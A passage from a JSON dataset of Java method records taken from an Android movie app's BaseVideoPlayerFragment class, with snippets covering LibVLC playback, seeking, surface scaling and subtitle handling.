"class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33794, "method_name": "onHardwareAccelerationError", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void onHardwareAccelerationError();\n\n    protected abstract void showTimedCaptionText(Caption text);\n\n    protected abstract SurfaceView getVideoSurface();\n\n    protected void setSeeking(boolean seeking) {\n        mSeeking = seeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33795, "method_name": "showTimedCaptionText", "class_name": "BaseVideoPlayerFragment", "params": ["Caption"], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "void", "snippet": "    protected abstract void showTimedCaptionText(Caption text);\n\n    protected abstract SurfaceView getVideoSurface();\n\n    protected void setSeeking(boolean seeking) {\n        mSeeking = seeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33796, "method_name": "getVideoSurface", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["abstract", "protected"], "return_type": "SurfaceView", "snippet": "    protected abstract SurfaceView getVideoSurface();\n\n    protected void setSeeking(boolean seeking) {\n        mSeeking = seeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33797, "method_name": "setSeeking", "class_name": "BaseVideoPlayerFragment", "params": ["boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setSeeking(boolean seeking) {\n        mSeeking = seeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33798, "method_name": "isSeeking", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean isSeeking() {\n        return mSeeking;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33799, "method_name": "prepareVlcVout", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void prepareVlcVout() {\n        final IVLCVout vlcVout = mMediaPlayer.getVLCVout();\n\n        if (!vlcVout.areViewsAttached()) {\n            vlcVout.setVideoView(getVideoSurface());\n            vlcVout.addCallback(this);\n            vlcVout.attachViews();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33800, "method_name": "saveVideoCurrentTime", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void saveVideoCurrentTime() {\n        long currentTime = mMediaPlayer.getTime();\n        PrefUtils.save(getActivity(), RESUME_POSITION, currentTime);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33801, "method_name": "resumeVideo", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resumeVideo() {\n        if (getActivity() != null) {\n            long resumePosition = PrefUtils.get(getActivity(), RESUME_POSITION, 0);\n            mDuration = mMediaPlayer.getLength();\n            if (mDuration > resumePosition && resumePosition > 0) {\n                setCurrentTime(resumePosition);\n                PrefUtils.save(getActivity(), RESUME_POSITION, 0);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33802, "method_name": "play", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void play() {\n        mMediaPlayer.play();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33803, "method_name": "pause", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pause() {\n        mMediaPlayer.pause();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33804, "method_name": "togglePlayPause", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void togglePlayPause() {\n        if (mEnded) {\n            loadMedia();\n        }\n\n        if (mMediaPlayer.isPlaying()) {\n            pause();\n        } else {\n            play();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33805, "method_name": "seekForwardClick", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void seekForwardClick() {\n        seek(10000);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33806, "method_name": "seekBackwardClick", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void seekBackwardClick() {\n        seek(-10000);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33807, "method_name": "scaleClick", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void scaleClick() {\n        if (mCurrentSize < SURFACE_ORIGINAL) {\n            mCurrentSize++;\n        } else {\n            mCurrentSize = 0;\n        }\n        changeSurfaceSize(true);\n        showOverlay();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33808, "method_name": "setCurrentTime", "class_name": "BaseVideoPlayerFragment", "params": ["long"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setCurrentTime(long time) {\n        if (time / getDuration() * 100 <= getStreamerProgress()) {\n            mMediaPlayer.setTime(time);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33809, "method_name": "getCurrentTime", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "long", "snippet": "    protected long getCurrentTime() {\n        return mMediaPlayer.getTime();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33810, "method_name": "getDuration", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "long", "snippet": "    protected long getDuration() {\n        return mDuration;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33811, "method_name": "getStreamerProgress", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getStreamerProgress() {\n        return mStreamerProgress;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33812, "method_name": "isPlaying", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean isPlaying() {\n        return mMediaPlayer.isPlaying();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33813, "method_name": "endReached", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void endReached() {\n        mEnded = true;\n        onPlaybackEndReached();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33814, "method_name": "onPlaybackEndReached", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onPlaybackEndReached();\n\n    private void handleHardwareAccelerationError() {\n        saveVideoCurrentTime();\n        mMediaPlayer.stop();\n        onHardwareAccelerationError();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33815, "method_name": "handleHardwareAccelerationError", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleHardwareAccelerationError() {\n        saveVideoCurrentTime();\n        mMediaPlayer.stop();\n        onHardwareAccelerationError();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33816, "method_name": "changeSurfaceSize", "class_name": "BaseVideoPlayerFragment", "params": ["boolean"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void changeSurfaceSize(boolean message) {\n        int screenWidth = getActivity().getWindow().getDecorView().getWidth();\n        int screenHeight = getActivity().getWindow().getDecorView().getHeight();\n\n        if (mMediaPlayer != null) {\n            final IVLCVout vlcVout = mMediaPlayer.getVLCVout();\n            vlcVout.setWindowSize(screenWidth, screenHeight);\n        }\n\n        double displayWidth = screenWidth, displayHeight = screenHeight;\n\n        if (screenWidth < screenHeight) {\n            displayWidth = screenHeight;\n            displayHeight = screenWidth;\n        }\n\n        // sanity check\n        if (displayWidth * displayHeight <= 1 || mVideoWidth * mVideoHeight <= 1) {\n            Timber.e(\"Invalid surface size\");\n            onErrorEncountered();\n            return;\n        }\n\n        // compute the aspect ratio\n        double aspectRatio, visibleWidth;\n        if (mSarDen == mSarNum) {\n\t\t\t/* No indication about the density, assuming 1:1 */\n            visibleWidth = mVideoVisibleWidth;\n            aspectRatio = (double) mVideoVisibleWidth / (double) mVideoVisibleHeight;\n        } else {\n\t\t\t/* Use the specified aspect ratio */\n            visibleWidth = mVideoVisibleWidth * (double) mSarNum / mSarDen;\n            aspectRatio = visibleWidth / mVideoVisibleHeight;\n        }\n\n        // compute the display aspect ratio\n        double displayAspectRatio = displayWidth / displayHeight;\n\n        switch (mCurrentSize) {\n            case SURFACE_BEST_FIT:\n                if (message) showPlayerInfo(getString(R.string.best_fit));\n                if (displayAspectRatio < aspectRatio)\n                    displayHeight = displayWidth / aspectRatio;\n                else\n                    displayWidth = displayHeight * aspectRatio;\n                break;\n            case SURFACE_FIT_HORIZONTAL:\n                displayHeight = displayWidth / aspectRatio;\n                if (message) showPlayerInfo(getString(R.string.fit_horizontal));\n                break;\n            case SURFACE_FIT_VERTICAL:\n                displayWidth = displayHeight * aspectRatio;\n                if (message) showPlayerInfo(getString(R.string.fit_vertical));\n                break;\n            case SURFACE_FILL:\n                if (message) showPlayerInfo(getString(R.string.fill));\n                break;\n            case SURFACE_16_9:\n                if (message) showPlayerInfo(\"16:9\");\n                aspectRatio = 16.0 / 9.0;\n                if (displayAspectRatio < aspectRatio)\n                    displayHeight = displayWidth / aspectRatio;\n                else\n                    displayWidth = displayHeight * aspectRatio;\n                break;\n            case SURFACE_4_3:\n                if (message) showPlayerInfo(\"4:3\");\n                aspectRatio = 4.0 / 3.0;\n                if (displayAspectRatio < aspectRatio)\n                    displayHeight = displayWidth / aspectRatio;\n                else\n                    displayWidth = displayHeight * aspectRatio;\n                break;\n            case SURFACE_ORIGINAL:\n                if (message) showPlayerInfo(getString(R.string.original_size));\n                displayHeight = mVideoVisibleHeight;\n                displayWidth = visibleWidth;\n                break;\n        }\n\n        // set display size\n        int finalWidth = (int) Math.ceil(displayWidth * mVideoWidth / mVideoVisibleWidth);\n        int finalHeight = (int) Math.ceil(displayHeight * mVideoHeight / mVideoVisibleHeight);\n\n        SurfaceHolder holder = getVideoSurface().getHolder();\n        holder.setFixedSize(finalWidth, finalHeight);\n\n        ViewGroup.LayoutParams lp = getVideoSurface().getLayoutParams();\n        lp.width = finalWidth;\n        lp.height = finalHeight;\n        getVideoSurface().setLayoutParams(lp);\n        getVideoSurface().invalidate();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33817, "method_name": "seek", "class_name": "BaseVideoPlayerFragment", "params": ["int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void seek(int delta) {\n        if (mMediaPlayer.getLength() <= 0 && !mSeeking) return;\n\n        long position = mMediaPlayer.getTime() + delta;\n        if (position < 0) position = 0;\n        setCurrentTime(position);\n        showOverlay();\n        onProgressChanged(getCurrentTime(), getDuration());\n        mLastSub = null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33818, "method_name": "setLastSubtitleCaption", "class_name": "BaseVideoPlayerFragment", "params": ["Caption"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setLastSubtitleCaption(Caption sub) {\n        mLastSub = sub;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33819, "method_name": "progressSubtitleCaption", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void progressSubtitleCaption() {\n        if (mLibVLC != null && mMediaPlayer != null && mMediaPlayer.isPlaying() && mSubs != null) {\n            Collection<Caption> subtitles = mSubs.captions.values();\n            double currentTime = getCurrentTime() - mSubtitleOffset;\n            if (mLastSub != null && currentTime >= mLastSub.start.getMilliseconds() && currentTime <= mLastSub.end.getMilliseconds()) {\n                showTimedCaptionText(mLastSub);\n            } else {\n                for (Caption caption : subtitles) {\n                    if (currentTime >= caption.start.getMilliseconds() && currentTime <= caption.end.getMilliseconds()) {\n                        mLastSub = caption;\n                        showTimedCaptionText(caption);\n                        break;\n                    } else if (currentTime > caption.end.getMilliseconds()) {\n                        showTimedCaptionText(null);\n                    }\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33820, "method_name": "onSubtitleLanguageSelected", "class_name": "BaseVideoPlayerFragment", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onSubtitleLanguageSelected(String language) {\n        if (mCurrentSubsLang != null && (language == null || mCurrentSubsLang.equals(language))) {\n            return;\n        }\n\n        mCurrentSubsLang = language;\n        mCallback.getInfo().setSubtitleLanguage(mCurrentSubsLang);\n\n        if (mCurrentSubsLang.equals(SubsProvider.SUBTITLE_LANGUAGE_NONE)) {\n            mSubs = null;\n            onSubtitleEnabledStateChanged(false);\n            return;\n        }\n\n        if (mMedia == null || mMedia.subtitles == null || mMedia.subtitles.size() == 0) {\n            mSubs = null;\n            onSubtitleEnabledStateChanged(false);\n            throw new IllegalArgumentException(\"Media doesn't have subtitle\");\n        }\n\n        if (!mMedia.subtitles.containsKey(mCurrentSubsLang)) {\n            mSubs = null;\n            onSubtitleEnabledStateChanged(false);\n            throw new IllegalArgumentException(\"Media doesn't have subtitle with specified language\");\n        }\n\n        showTimedCaptionText(null);\n        loadOrDownloadSubtitle();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33821, "method_name": "loadOrDownloadSubtitle", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void loadOrDownloadSubtitle() {\n        if (mMedia == null) throw new NullPointerException(\"Media is not available\");\n        if (mCurrentSubsLang.equals(SubsProvider.SUBTITLE_LANGUAGE_NONE)) return;\n\n        SubtitleDownloader subtitleDownloader = new SubtitleDownloader(\n                providerManager.getCurrentSubsProvider(),\n                getActivity(), mCallback.getInfo(), mCurrentSubsLang);\n        subtitleDownloader.setSubtitleDownloaderListener(this);\n\n        try {\n            mSubsFile = SubtitleDownloader.getDownloadedSubtitleFile(getActivity(), mMedia, mCurrentSubsLang);\n            if (mSubsFile != null && mSubsFile.exists()) {\n                subtitleDownloader.parseSubtitle(mSubsFile);\n            }\n        }\n        catch (FileNotFoundException e) {\n            subtitleDownloader.downloadSubtitle();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33822, "method_name": "onNewLayout", "class_name": "BaseVideoPlayerFragment", "params": ["IVLCVout", "int", "int", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onNewLayout(\n        IVLCVout vlcVout, int width, int height, int visibleWidth, int visibleHeight, int sarNum, int sarDen) {\n        if (width * height <= 0) {\n            return;\n        }\n\n        // store video size\n        mVideoWidth = width;\n        mVideoHeight = height;\n        mVideoVisibleWidth  = visibleWidth;\n        mVideoVisibleHeight = visibleHeight;\n        mSarNum = sarNum;\n        mSarDen = sarDen;\n\n        changeSurfaceLayout();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33823, "method_name": "onSubtitleEnabledStateChanged", "class_name": "BaseVideoPlayerFragment", "params": ["boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onSubtitleEnabledStateChanged(boolean enabled) {}", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33824, "method_name": "onSurfacesCreated", "class_name": "BaseVideoPlayerFragment", "params": ["IVLCVout"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfacesCreated(IVLCVout ivlcVout) { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33825, "method_name": "onSurfacesDestroyed", "class_name": "BaseVideoPlayerFragment", "params": ["IVLCVout"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfacesDestroyed(IVLCVout ivlcVout) { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33826, "method_name": "onEvent", "class_name": "BaseVideoPlayerFragment", "params": ["MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEvent(MediaPlayer.Event event) {\n        switch (event.type) {\n            case MediaPlayer.Event.Playing:\n                getVideoSurface().getHolder().setKeepScreenOn(true);\n                mDuration = mMediaPlayer.getLength();\n                resumeVideo();\n                setProgressVisible(false);\n                showOverlay();\n                updatePlayPauseState();\n                break;\n            case MediaPlayer.Event.Paused:\n                getVideoSurface().getHolder().setKeepScreenOn(false);\n                saveVideoCurrentTime();\n                updatePlayPauseState();\n                break;\n            case MediaPlayer.Event.Stopped:\n                getVideoSurface().getHolder().setKeepScreenOn(false);\n                updatePlayPauseState();\n                break;\n            case MediaPlayer.Event.EndReached:\n                endReached();\n                updatePlayPauseState();\n                break;\n            case MediaPlayer.Event.EncounteredError:\n                onErrorEncountered();\n                updatePlayPauseState();\n                break;\n            case MediaPlayer.Event.Opening:\n                setProgressVisible(true);\n                mDuration = mMediaPlayer.getLength();\n                mMediaPlayer.play();\n                break;\n            case MediaPlayer.Event.TimeChanged:\n            case MediaPlayer.Event.PositionChanged:\n                onProgressChanged(getCurrentTime(), getDuration());\n                progressSubtitleCaption();\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33827, "method_name": "eventHardwareAccelerationError", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void eventHardwareAccelerationError() {\n        handleHardwareAccelerationError();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33828, "method_name": "changeSurfaceLayout", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void changeSurfaceLayout() {\n        changeSurfaceSize(false);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33829, "method_name": "onStreamPrepared", "class_name": "BaseVideoPlayerFragment", "params": ["Torrent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamPrepared(Torrent torrent) { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33830, "method_name": "onStreamStarted", "class_name": "BaseVideoPlayerFragment", "params": ["Torrent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamStarted(Torrent torrent) { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33831, "method_name": "onStreamStopped", "class_name": "BaseVideoPlayerFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamStopped() { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": ["IVLCVout", "TorrentServerListener", "MediaPlayer", "LibVLC", "SubtitleDownloader"], "modifiers": ["public", "abstract"]}}, {"id": 33832, "method_name": "onStreamError", "class_name": "BaseVideoPlayerFragment", "params": ["Torrent", "Exception"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStreamError(Torrent torrent, Exception e) { }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/fragments/BaseVideoPlayerFragment.java", "stars": "4", "class_props": {"extends": "Fragment", "implements": 